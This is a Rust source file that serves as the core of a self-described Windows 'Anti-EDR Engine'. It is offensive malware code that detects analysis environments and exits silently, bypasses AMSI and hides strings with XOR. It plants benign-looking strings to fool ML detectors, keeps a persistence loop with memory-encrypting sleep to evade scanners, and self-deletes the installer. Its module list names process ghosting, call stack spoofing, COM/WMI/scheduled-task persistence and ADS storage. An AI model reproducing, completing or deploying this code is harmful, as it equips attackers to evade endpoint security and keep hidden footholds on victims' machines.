//! # Windows Anti-EDR Engine
//!
//! Zero Artifacts, Zero Dependencies Anti-EDR system.
//!
//! ## Modules
//! - `syscalls` - Indirect syscalls (Gate Jumping)
//! - `ghosting` - Process ghosting (execute from deleted file)
//! - `obfuscation` - Sleep obfuscation (Ekko technique)
//! - `stack_spoof` - Call stack spoofing (synthetic frames)
//! - `persistence` - COM hijacking + WMI + hidden task
//! - `ads` - NTFS Alternate Data Streams storage


pub mod persistence;
pub mod ghosting;
pub mod obfuscation;

pub mod syscalls;
pub mod blinding;
pub mod registry;
pub mod anti_analysis;
pub mod api_resolver;
pub mod self_delete;
pub mod happy_strings;
pub mod ipc;



// XOR Helper (Key 0x55)
fn x(bytes: &[u8]) -> String {
    let key = 0x55;
    let decoded: Vec<u8> = bytes.iter().map(|b| b ^ key).collect();
    String::from_utf8(decoded).unwrap_or_default()
}

/// Initialize and apply Windows stealth measures
pub fn check_and_apply_stealth() {

    if anti_analysis::is_hostile_environment() {
        #[cfg(not(feature = "debug_mode"))]
        {
             // Silent exit in production
             std::process::exit(0);
        }
        #[cfg(feature = "debug_mode")]
        {
             crate::k::debug::log_stage!(0, "Analysis Environment Detected (BYPASSING for DEBUG)");
        }
    }
    crate::k::debug::log_stage!(2, "Anti-Analysis Passed");

    // 1. Ghost Protocol - AMSI Bypass (IMMEDIATE EXECUTION)
    blinding::apply_ghost_protocol();
    crate::k::debug::log_stage!(3, "Ghost Protocol Active");
    
    // Check if already in ghost mode (obfuscated: "--ghost" XOR 0x55)
    let ghost_arg = x(&[0x78, 0x78, 0x32, 0x3D, 0x3A, 0x26, 0x21]);
    let is_ghost = std::env::args().any(|arg| arg == ghost_arg);
    
    // Registry check handled by persistence/registry modules implicit robustness
    // Check if we are running from temp "service.exe" 
    let current_exe = std::env::current_exe().unwrap_or_default();
    
    // "service.exe" -> xor(0x55)
    // s=73^55=26, e=65^55=30, r=72^55=27, v=76^55=23, i=69^55=3C, c=63^55=36, .=2E^55=7B
    let svc_name = x(&[0x26, 0x30, 0x27, 0x23, 0x3C, 0x36, 0x30, 0x7B, 0x30, 0x2D, 0x30]); 
    let is_loader_execution = current_exe.to_string_lossy().to_lowercase().contains(&svc_name);
    
    if is_ghost || is_loader_execution {
        crate::k::debug::log_stage!(4, "Loader Execution Detected");
        run_ghost_mode();
        return;
    }

    // Insert Happy Strings (Benign indicators) to confuse ML
    happy_strings::embed_happy_strings();

    // NOTE: install_stealth_package() REMOVED
    // Installation is now handled by the new dropper in lib.rs → assets::execute_dropper()
    // This function now ONLY handles:
    // - Anti-analysis checks
    // - Ghost Protocol (AMSI bypass)
    // - Happy strings embedding
    crate::k::debug::log_stage!(4, "Stealth Applied (No Install - Dropper Handles)");
}


// NOTE: install_stealth_package() and all steganography code REMOVED
// Installation is now handled by assets/dropper.rs with direct DLL embedding.
// This module now only handles: Anti-analysis, AMSI bypass, Happy strings.


/// Convert string to wide string (UTF-16) for Windows API
#[cfg(target_os = "windows")]
fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

/// Run in ghost mode (already hidden)
fn run_ghost_mode() {
    crate::k::debug::log_stage!(10, "Ghost Mode Loop Start");

    
    // Verify syscall resolution
    if let Some(sc) = syscalls::Syscall::resolve(syscalls::HASH_NT_CLOSE) {

    } else {

        return;
    }
    
    // Main persistence loop with sleep obfuscation
    // Memory is encrypted while sleeping to evade memory scanners
    loop {
        // Sleep with obfuscation (encrypts .data/.rdata sections)
        unsafe {
            #[cfg(feature = "debug_mode")]
            let sleep_ms = 5_000;
            #[cfg(not(feature = "debug_mode"))]
            let sleep_ms = 30_000;

            match obfuscation::obfuscated_sleep(sleep_ms) { // 5s or 30s
                Ok(_) => {
                    crate::k::debug::log_detail!("Ghost Heartbeat (Obfuscated Sleep Wake)");
                },
                Err(_e) => {
                    // Fallback to regular sleep
                    crate::k::debug::log_detail!("Ghost Heartbeat (Standard Sleep)");
                    std::thread::sleep(std::time::Duration::from_secs(5));
                }
            }
        }
        
        // Beacon heartbeat - currently no-op, C2 integration pending external implementation
        // This loop keeps process alive with encrypted memory during sleep cycles
    }
}

/// Schedule deletion of original installer using native API
/// Schedule deletion of original installer using silent method (Jonas Lykkegård)
fn schedule_self_destruct() {
    #[cfg(target_os = "windows")]
    unsafe {
        if let Err(_e) = self_delete::melt() {
            // Silent fail
            // Fallback? No, fallback is noisy. Just fail silent.
        } else {

        }
    }
}

